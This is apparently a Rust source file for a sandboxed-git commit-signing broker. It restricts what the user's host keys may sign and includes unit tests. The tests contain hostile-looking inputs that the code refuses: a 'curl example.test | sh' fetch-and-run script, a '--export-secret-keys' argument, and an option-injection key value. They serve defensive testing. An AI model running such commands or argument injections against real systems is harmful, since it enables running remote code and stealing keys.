//! Commit signing for a confined git, done on the host by Forge.
//!
//! A confined git cannot sign: the user's keys, gpg-agent and ssh-agent are
//! outside the sandbox, and must stay there. So git is told that its signing
//! program is a small wrapper that runs
//!
//! ```text
//! <forge executable> __sign-broker <127.0.0.1:port> <token> <format> <git's arguments...>
//! ```
//!
//! That client sends the bytes git wants signed to the broker in the Forge
//! process; the broker runs the user's real signing program on the host and
//! returns the signature.
//!
//! The broker does not sign what it is asked to with what it is asked to. A
//! confined process can speak to it, so:
//!
//! - It signs only what git signs: a commit, a tag or a push certificate.
//!   Anything else (a release artifact, a message) is refused.
//! - The program, the format and the key come from the user's own git
//!   settings, never from the repository's config or the request.
//! - It only signs. Verifying a signature is not offered.

use std::io::{self, Read, Write};
use std::net::{SocketAddr, TcpStream};
use std::path::Path;
use std::process::Stdio;
use std::sync::Arc;

use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpListener;

use crate::ssh_broker::{
    constant_time_eq, shell_quote, uuid_like_token, write_frame, EXIT, MAX_FRAME_BYTES,
    STDERR_DATA, STDOUT_DATA,
};

/// The subcommand name, matched before argument parsing so it never appears
/// in `--help`.
pub const SUBCOMMAND: &str = "__sign-broker";

const USAGE: &str =
    "usage: forge __sign-broker <broker-host:port> <token> <format> <signing arguments...>";

/// Largest payload the broker signs. A commit or tag object is its headers
/// and message.
const MAX_PAYLOAD_BYTES: usize = 8 * 1024 * 1024;
const MAX_HEADER_BYTES: usize = 4 * 1024;

/// Git's `gpg.format`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Format {
    Openpgp,
    X509,
    Ssh,
}

impl Format {
    pub const ALL: [Format; 3] = [Format::Openpgp, Format::X509, Format::Ssh];

    pub fn name(self) -> &'static str {
        match self {
            Format::Openpgp => "openpgp",
            Format::X509 => "x509",
            Format::Ssh => "ssh",
        }
    }

    pub fn parse(name: &str) -> Option<Self> {
        Self::ALL.into_iter().find(|format| format.name() == name)
    }

    /// The program git runs for this format when none is configured.
    pub fn default_program(self) -> &'static str {
        match self {
            Format::Openpgp => "gpg",
            Format::X509 => "gpgsm",
            Format::Ssh => "ssh-keygen",
        }
    }
}

/// How the user signs, from their own settings.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Signer {
    pub format: Format,
    /// The signing program, run directly (not through a shell).
    pub program: String,
    /// `user.signingkey`. For SSH, a key file path or a literal public key.
    pub key: Option<String>,
}

/// Produces the user's signer, or why signing cannot be done. Called when a
/// request arrives, so a git invocation that never signs costs nothing.
pub type Resolve = Arc<
    dyn Fn() -> std::pin::Pin<Box<dyn std::future::Future<Output = Result<Signer, String>> + Send>>
        + Send
        + Sync,
>;

/// A running broker for one git invocation. Dropping it stops accepting.
pub struct SignBroker {
    addr: SocketAddr,
    token: String,
    accept: tokio::task::JoinHandle<()>,
}

impl Drop for SignBroker {
    fn drop(&mut self) {
        self.accept.abort();
    }
}

impl SignBroker {
    pub async fn start(resolve: Resolve) -> io::Result<Self> {
        let listener = TcpListener::bind(("127.0.0.1", 0)).await?;
        let addr = listener.local_addr()?;
        let token = uuid_like_token();
        let expected = token.clone();
        let accept = tokio::spawn(async move {
            loop {
                let Ok((stream, _)) = listener.accept().await else {
                    return;
                };
                let (resolve, expected) = (Arc::clone(&resolve), expected.clone());
                tokio::spawn(async move {
                    let _ = serve(stream, resolve, &expected).await;
                });
            }
        });
        Ok(Self {
            addr,
            token,
            accept,
        })
    }

    /// A broker that always signs with `signer`.
    pub async fn start_fixed(signer: Signer) -> io::Result<Self> {
        Self::start(Arc::new(move || {
            let signer = signer.clone();
            Box::pin(async move { Ok(signer) })
        }))
        .await
    }

    pub fn addr(&self) -> SocketAddr {
        self.addr
    }

    /// Git config that makes a git use this broker for every signing format.
    ///
    /// Git runs its signing program directly, with no shell and no room for
    /// extra arguments, so each format gets a wrapper script in `dir` (which
    /// the confined git must be able to read). `exe` is the Forge executable
    /// providing [`SUBCOMMAND`].
    pub fn git_config(&self, exe: &str, dir: &Path) -> io::Result<Vec<(String, String)>> {
        use std::os::unix::fs::PermissionsExt as _;
        let mut config = Vec::new();
        for format in Format::ALL {
            let wrapper = dir.join(format!("forge-sign-{}", format.name()));
            std::fs::write(
                &wrapper,
                format!(
                    "#!/bin/sh\nexec {} {SUBCOMMAND} {} {} {} \"$@\"\n",
                    shell_quote(exe),
                    self.addr,
                    self.token,
                    format.name()
                ),
            )?;
            std::fs::set_permissions(&wrapper, std::fs::Permissions::from_mode(0o700))?;
            let wrapper = wrapper
                .to_str()
                .ok_or_else(|| io::Error::other("the wrapper path is not UTF-8"))?
                .to_string();
            config.push((format!("gpg.{}.program", format.name()), wrapper.clone()));
            if format == Format::Openpgp {
                config.push(("gpg.program".into(), wrapper));
            }
        }
        Ok(config)
    }
}

/// A broker that signs the way the user signs in `repo`, and the git config
/// that reaches it, with its wrapper scripts written to `scratch`.
pub(crate) async fn start_for_repo(
    repo: &Path,
    scratch: &Path,
) -> Option<(SignBroker, Vec<(String, String)>)> {
    let exe = crate::git_network::helper_exe().ok()?;
    let repo = repo.to_path_buf();
    let resolve: Resolve = Arc::new(move || {
        let repo = repo.clone();
        Box::pin(async move { crate::git_network::host_signer(&repo).await })
    });
    let broker = SignBroker::start(resolve).await.ok()?;
    let config = broker.git_config(&exe, scratch).ok()?;
    Some((broker, config))
}

/// Add settings to the `GIT_CONFIG_COUNT`/`KEY`/`VALUE` variables in `env`,
/// after the ones already there.
pub(crate) fn push_git_config(env: &mut Vec<(String, String)>, config: Vec<(String, String)>) {
    let mut count = match env.iter().position(|(name, _)| name == "GIT_CONFIG_COUNT") {
        Some(at) => env.remove(at).1.parse().unwrap_or(0),
        None => 0usize,
    };
    for (key, value) in config {
        env.push((format!("GIT_CONFIG_KEY_{count}"), key));
        env.push((format!("GIT_CONFIG_VALUE_{count}"), value));
        count += 1;
    }
    env.push(("GIT_CONFIG_COUNT".into(), count.to_string()));
}

/// Whether `payload` is something git signs: a commit object, a tag object
/// or a push certificate. The broker signs nothing else, so the user's key
/// cannot be borrowed to sign an arbitrary file.
pub fn is_git_payload(payload: &[u8]) -> bool {
    fn object_id_line<'a>(text: &'a [u8], prefix: &[u8]) -> Option<&'a [u8]> {
        let rest = text.strip_prefix(prefix)?;
        let end = rest.iter().position(|byte| *byte == b'\n')?;
        let id = &rest[..end];
        ((id.len() == 40 || id.len() == 64) && id.iter().all(u8::is_ascii_hexdigit))
            .then_some(&rest[end + 1..])
    }
    if let Some(rest) = object_id_line(payload, b"tree ") {
        return rest.starts_with(b"parent ") || rest.starts_with(b"author ");
    }
    if let Some(rest) = object_id_line(payload, b"object ") {
        return rest.starts_with(b"type ");
    }
    payload.starts_with(b"certificate version 0.1\npusher ")
}

async fn refuse<W>(writer: &mut W, why: &str) -> io::Result<()>
where
    W: tokio::io::AsyncWrite + Unpin,
{
    let message = format!("forge: cannot sign: {why}\n");
    write_frame(writer, STDERR_DATA, message.as_bytes()).await?;
    write_frame(writer, EXIT, &1i32.to_be_bytes()).await
}

/// What a signer run produced.
struct Signed {
    signature: Vec<u8>,
    stderr: Vec<u8>,
    code: i32,
}

async fn serve(stream: tokio::net::TcpStream, resolve: Resolve, token: &str) -> io::Result<()> {
    let (read_half, mut write_half) = stream.into_split();
    let mut reader = BufReader::new(read_half);

    // Header: the token, the format, the key git named (may be empty), one
    // per line. Then the payload: a length and that many bytes.
    let mut header = Vec::new();
    let mut total = 0;
    while header.len() < 3 {
        let mut line = String::new();
        let n = reader.read_line(&mut line).await?;
        total += n;
        if n == 0 || !line.ends_with('\n') || total > MAX_HEADER_BYTES {
            return refuse(&mut write_half, "malformed request").await;
        }
        line.pop();
        header.push(line);
    }
    if !constant_time_eq(&header[0], token) {
        return refuse(&mut write_half, "not the git invocation this broker serves").await;
    }
    let Some(format) = Format::parse(&header[1]) else {
        return refuse(&mut write_half, "unknown signature format").await;
    };
    let len = reader.read_u32().await? as usize;
    if len > MAX_PAYLOAD_BYTES {
        return refuse(&mut write_half, "the payload is too large").await;
    }
    let mut payload = vec![0; len];
    reader.read_exact(&mut payload).await?;
    if !is_git_payload(&payload) {
        return refuse(
            &mut write_half,
            "only commits, tags and push certificates are signed from inside the sandbox",
        )
        .await;
    }
    let signer = match resolve().await {
        Ok(signer) => signer,
        Err(why) => return refuse(&mut write_half, &why).await,
    };
    if signer.format != format {
        let why = format!(
            "this repository asks for {} signatures, but your git settings sign with {}",
            format.name(),
            signer.format.name()
        );
        return refuse(&mut write_half, &why).await;
    }
    let signed = match format {
        Format::Ssh => sign_ssh(&signer, &payload).await,
        Format::Openpgp | Format::X509 => sign_gpg(&signer, &header[2], &payload).await,
    };
    let signed = match signed {
        Ok(signed) => signed,
        Err(why) => return refuse(&mut write_half, &why).await,
    };
    for chunk in signed.signature.chunks(MAX_FRAME_BYTES) {
        write_frame(&mut write_half, STDOUT_DATA, chunk).await?;
    }
    for chunk in signed.stderr.chunks(MAX_FRAME_BYTES) {
        write_frame(&mut write_half, STDERR_DATA, chunk).await?;
    }
    write_frame(&mut write_half, EXIT, &signed.code.to_be_bytes()).await
}

/// `~/x` as git reads it in a path setting.
fn expand_home(path: &str) -> std::path::PathBuf {
    match (path.strip_prefix("~/"), std::env::var_os("HOME")) {
        (Some(rest), Some(home)) => Path::new(&home).join(rest),
        _ => path.into(),
    }
}

fn host_command(program: &str) -> tokio::process::Command {
    let mut command = tokio::process::Command::new(expand_home(program));
    crate::builtins::strip_credentials(command.as_std_mut(), &[]);
    command
        .current_dir(std::env::temp_dir())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true);
    command
}

/// `gpg --status-fd=2 -bsau <key>`, the payload on stdin, as git runs it.
async fn sign_gpg(signer: &Signer, requested_key: &str, payload: &[u8]) -> Result<Signed, String> {
    // Without `user.signingkey` git names the committer; that is not a
    // secret and not a choice of program, so the request's value is used.
    let key = signer.key.as_deref().unwrap_or(requested_key);
    if key.is_empty() || key.starts_with('-') || key.chars().any(char::is_control) {
        return Err("no usable signing key is configured".into());
    }
    let mut command = host_command(&signer.program);
    command
        .args(["--status-fd=2", "-bsau", key])
        .stdin(Stdio::piped());
    let mut child = command
        .spawn()
        .map_err(|error| format!("cannot start {}: {error}", signer.program))?;
    let mut stdin = child.stdin.take().expect("piped");
    let input = payload.to_vec();
    let feed = tokio::spawn(async move {
        let _ = stdin.write_all(&input).await;
        let _ = stdin.shutdown().await;
    });
    let output = child
        .wait_with_output()
        .await
        .map_err(|error| format!("{} failed: {error}", signer.program))?;
    feed.abort();
    Ok(Signed {
        signature: output.stdout,
        stderr: output.stderr,
        code: output.status.code().unwrap_or(1),
    })
}

/// `ssh-keygen -Y sign -n git -f <key> [-U] <file>`, as git runs it: the
/// signature is written next to the file.
async fn sign_ssh(signer: &Signer, payload: &[u8]) -> Result<Signed, String> {
    let key = signer.key.as_deref().ok_or(
        "SSH signing needs `user.signingkey` in your own git config \
         (not the repository's)",
    )?;
    let dir = tempfile::Builder::new()
        .prefix("forge-sign-")
        .tempdir()
        .map_err(|error| format!("cannot create a scratch directory: {error}"))?;
    let buffer = dir.path().join("payload");
    std::fs::write(&buffer, payload).map_err(|error| error.to_string())?;

    let mut command = host_command(&signer.program);
    command.args(["-Y", "sign", "-n", "git", "-f"]);
    // A literal public key (`ssh-ed25519 AAAA...` or `key::...`) names a
    // key held by the agent; anything else is a key file.
    let literal = key
        .strip_prefix("key::")
        .or_else(|| key.starts_with("ssh-").then_some(key));
    match literal {
        Some(public_key) => {
            let key_file = dir.path().join("key.pub");
            std::fs::write(&key_file, format!("{public_key}\n"))
                .map_err(|error| error.to_string())?;
            command.arg(&key_file).arg("-U");
        }
        None => {
            let path = expand_home(key);
            if !path.is_absolute() {
                return Err("`user.signingkey` is not an absolute key file path".into());
            }
            command.arg(path);
        }
    }
    let output = command
        .arg(&buffer)
        .stdin(Stdio::null())
        .output()
        .await
        .map_err(|error| format!("cannot start {}: {error}", signer.program))?;
    let signature = if output.status.success() {
        std::fs::read(dir.path().join("payload.sig"))
            .map_err(|error| format!("{} wrote no signature: {error}", signer.program))?
    } else {
        Vec::new()
    };
    Ok(Signed {
        signature,
        stderr: output.stderr,
        code: output.status.code().unwrap_or(1),
    })
}

/// What git asked its signing program to do, checked.
#[derive(Debug, PartialEq, Eq)]
enum ClientRequest {
    /// Sign stdin, signature to stdout.
    Gpg { key: String },
    /// Sign the file, signature to `<file>.sig`.
    Ssh { buffer: String },
}

fn parse_client_args(format: Format, args: &[String]) -> Option<ClientRequest> {
    let args: Vec<&str> = args.iter().map(String::as_str).collect();
    match (format, args.as_slice()) {
        (Format::Openpgp | Format::X509, ["--status-fd=2", "-bsau", key]) => {
            Some(ClientRequest::Gpg {
                key: (*key).to_string(),
            })
        }
        (
            Format::Ssh,
            ["-Y", "sign", "-n", "git", "-f", _, buffer]
            | ["-Y", "sign", "-n", "git", "-f", _, "-U", buffer],
        ) => Some(ClientRequest::Ssh {
            buffer: (*buffer).to_string(),
        }),
        _ => None,
    }
}

/// Run the client and return the process exit code.
pub fn run(args: &[String]) -> i32 {
    let [addr, token, format, signing_args @ ..] = args else {
        eprintln!("{USAGE}");
        return 2;
    };
    let request = Format::parse(format).and_then(|format| parse_client_args(format, signing_args));
    let Some(request) = request else {
        eprintln!(
            "forge: inside the sandbox git can sign, but not verify signatures or use its \
             signing program for anything else"
        );
        return 2;
    };
    let result = (|| -> io::Result<i32> {
        let (key, payload) = match &request {
            ClientRequest::Gpg { key } => {
                let mut payload = Vec::new();
                io::stdin().read_to_end(&mut payload)?;
                (key.as_str(), payload)
            }
            ClientRequest::Ssh { buffer } => ("", std::fs::read(buffer)?),
        };
        let stream = TcpStream::connect(addr)?;
        let (code, signature) = client_session(stream, token, format, key, &payload, io::stderr())?;
        match &request {
            ClientRequest::Gpg { .. } => {
                let mut stdout = io::stdout();
                stdout.write_all(&signature)?;
                stdout.flush()?;
            }
            ClientRequest::Ssh { buffer } if code == 0 => {
                std::fs::write(format!("{buffer}.sig"), &signature)?;
            }
            ClientRequest::Ssh { .. } => {}
        }
        Ok(code)
    })();
    match result {
        Ok(code) => code,
        Err(error) => {
            eprintln!("forge __sign-broker: {error}");
            1
        }
    }
}

/// One signing request: returns the signer's exit code and the signature.
/// The signer's diagnostics go to `stderr` (git reads gpg's status there).
fn client_session(
    mut stream: TcpStream,
    token: &str,
    format: &str,
    key: &str,
    payload: &[u8],
    mut stderr: impl Write,
) -> io::Result<(i32, Vec<u8>)> {
    if key.contains('\n') {
        return Err(io::Error::other("the key name contains a newline"));
    }
    stream.write_all(format!("{token}\n{format}\n{key}\n").as_bytes())?;
    stream.write_all(&(payload.len() as u32).to_be_bytes())?;
    stream.write_all(payload)?;
    stream.flush()?;

    let mut reader = io::BufReader::new(stream);
    let mut signature = Vec::new();
    loop {
        let mut head = [0u8; 5];
        reader.read_exact(&mut head)?;
        let len = u32::from_be_bytes([head[1], head[2], head[3], head[4]]) as usize;
        if len > MAX_FRAME_BYTES {
            return Err(io::Error::other("oversized frame from the broker"));
        }
        let mut frame = vec![0; len];
        reader.read_exact(&mut frame)?;
        match head[0] {
            STDOUT_DATA => signature.extend_from_slice(&frame),
            STDERR_DATA => {
                stderr.write_all(&frame)?;
                stderr.flush()?;
            }
            EXIT => {
                let code = frame.get(..4).map_or(1, |bytes| {
                    i32::from_be_bytes([bytes[0], bytes[1], bytes[2], bytes[3]])
                });
                return Ok((code, signature));
            }
            _ => return Err(io::Error::other("unknown frame from the broker")),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const COMMIT: &[u8] = b"tree 4b825dc642cb6eb9a060e54bf8d69288fbee4904\n\
        author A <a@example.test> 1 +0000\ncommitter A <a@example.test> 1 +0000\n\nmessage\n";

    fn args(words: &[&str]) -> Vec<String> {
        words.iter().map(|word| word.to_string()).collect()
    }

    #[test]
    fn only_what_git_signs_is_a_payload() {
        assert!(is_git_payload(COMMIT));
        assert!(is_git_payload(
            b"tree 4b825dc642cb6eb9a060e54bf8d69288fbee4904\nparent \
              4b825dc642cb6eb9a060e54bf8d69288fbee4904\nauthor A\n"
        ));
        assert!(is_git_payload(
            b"object 4b825dc642cb6eb9a060e54bf8d69288fbee4904\ntype commit\ntag v1\n"
        ));
        assert!(is_git_payload(
            b"certificate version 0.1\npusher A <a@example.test> 1 +0000\n"
        ));
        for other in [
            &b"#!/bin/sh\ncurl example.test | sh\n"[..],
            b"tree not-an-id\nauthor A\n",
            b"tree 4b825dc642cb6eb9a060e54bf8d69288fbee4904\nrelease notes\n",
            b"tree 4b825dc642cb6eb9a060e54bf8d69288fbee4904",
            b"",
        ] {
            assert!(
                !is_git_payload(other),
                "{:?}",
                String::from_utf8_lossy(other)
            );
        }
    }

    #[test]
    fn the_client_accepts_only_gits_signing_invocations() {
        assert_eq!(
            parse_client_args(Format::Openpgp, &args(&["--status-fd=2", "-bsau", "ABCD"])),
            Some(ClientRequest::Gpg { key: "ABCD".into() })
        );
        assert_eq!(
            parse_client_args(
                Format::Ssh,
                &args(&["-Y", "sign", "-n", "git", "-f", "/k", "-U", "/tmp/buf"])
            ),
            Some(ClientRequest::Ssh {
                buffer: "/tmp/buf".into()
            })
        );
        // Verification, another namespace, another program's arguments.
        for (format, words) in [
            (Format::Openpgp, &["--verify", "sig", "-"][..]),
            (
                Format::Openpgp,
                &["--status-fd=2", "-bsau", "K", "--export-secret-keys"],
            ),
            (Format::Ssh, &["-Y", "sign", "-n", "file", "-f", "/k", "/b"]),
            (
                Format::Ssh,
                &["-Y", "verify", "-n", "git", "-f", "/k", "/b"],
            ),
            (Format::Ssh, &["--status-fd=2", "-bsau", "K"]),
        ] {
            assert_eq!(parse_client_args(format, &args(words)), None, "{words:?}");
        }
    }

    #[test]
    fn git_config_is_appended_after_the_settings_already_in_the_environment() {
        let mut env = vec![
            (
                "GIT_CONFIG_KEY_0".to_string(),
                "credential.helper".to_string(),
            ),
            ("GIT_CONFIG_VALUE_0".to_string(), String::new()),
            ("GIT_CONFIG_COUNT".to_string(), "1".to_string()),
        ];
        push_git_config(&mut env, vec![("gpg.program".into(), "/w".into())]);
        let value = |name: &str| {
            let found: Vec<_> = env.iter().filter(|(key, _)| key == name).collect();
            assert_eq!(found.len(), 1, "{name}");
            found[0].1.clone()
        };
        assert_eq!(value("GIT_CONFIG_COUNT"), "2");
        assert_eq!(value("GIT_CONFIG_KEY_0"), "credential.helper");
        assert_eq!(value("GIT_CONFIG_KEY_1"), "gpg.program");
        assert_eq!(value("GIT_CONFIG_VALUE_1"), "/w");
    }

    /// A stand-in for gpg: prints its arguments and stdin as the "signature".
    fn fake_gpg(dir: &Path) -> String {
        use std::os::unix::fs::PermissionsExt as _;
        let path = dir.join("fake-gpg");
        std::fs::write(
            &path,
            "#!/bin/sh\nprintf 'args:%s\\n' \"$*\"\ncat\necho '[GNUPG:] SIG_CREATED ' >&2\n",
        )
        .unwrap();
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
        path.to_string_lossy().into_owned()
    }

    async fn request(
        broker: &SignBroker,
        token: Option<&str>,
        format: &'static str,
        key: &'static str,
        payload: &'static [u8],
    ) -> (i32, String, String) {
        let (addr, token) = (broker.addr, token.unwrap_or(&broker.token).to_string());
        tokio::task::spawn_blocking(move || {
            let mut stderr = Vec::new();
            let stream = TcpStream::connect(addr).unwrap();
            let (code, signature) =
                client_session(stream, &token, format, key, payload, &mut stderr).unwrap();
            (
                code,
                String::from_utf8_lossy(&signature).into_owned(),
                String::from_utf8_lossy(&stderr).into_owned(),
            )
        })
        .await
        .unwrap()
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn a_commit_is_signed_with_the_users_program_and_key_not_the_requests() {
        let dir = tempfile::tempdir().unwrap();
        let broker = SignBroker::start_fixed(Signer {
            format: Format::Openpgp,
            program: fake_gpg(dir.path()),
            key: Some("USERKEY".into()),
        })
        .await
        .unwrap();

        let (code, signature, stderr) =
            request(&broker, None, "openpgp", "SOMEONE-ELSE", COMMIT).await;
        assert_eq!(code, 0, "{stderr}");
        assert!(
            signature.starts_with("args:--status-fd=2 -bsau USERKEY\n"),
            "{signature}"
        );
        assert!(signature.ends_with("message\n"));
        assert!(stderr.contains("SIG_CREATED"));
    }

    #[tokio::test(flavor = "multi_thread")]
    async fn requests_git_would_not_make_are_refused() {
        let dir = tempfile::tempdir().unwrap();
        let broker = SignBroker::start_fixed(Signer {
            format: Format::Openpgp,
            program: fake_gpg(dir.path()),
            key: None,
        })
        .await
        .unwrap();

        // Not a git object.
        let (code, signature, stderr) =
            request(&broker, None, "openpgp", "K", b"pay me 100 dollars\n").await;
        assert_ne!(code, 0);
        assert!(signature.is_empty());
        assert!(stderr.contains("only commits, tags"), "{stderr}");

        // The wrong token.
        let (code, signature, _) = request(&broker, Some("guess"), "openpgp", "K", COMMIT).await;
        assert!(code != 0 && signature.is_empty());

        // A format the user does not sign with.
        let (code, _, stderr) = request(&broker, None, "ssh", "", COMMIT).await;
        assert_ne!(code, 0);
        assert!(
            stderr.contains("your git settings sign with openpgp"),
            "{stderr}"
        );

        // A key that would be read as an option.
        let (code, signature, _) = request(&broker, None, "openpgp", "--export", COMMIT).await;
        assert!(code != 0 && signature.is_empty());

        // With no key of the user's, git's own choice (the committer) is used.
        let (code, signature, _) = request(&broker, None, "openpgp", "A <a@b.test>", COMMIT).await;
        assert_eq!(code, 0);
        assert!(signature.starts_with("args:--status-fd=2 -bsau A <a@b.test>\n"));
    }
}
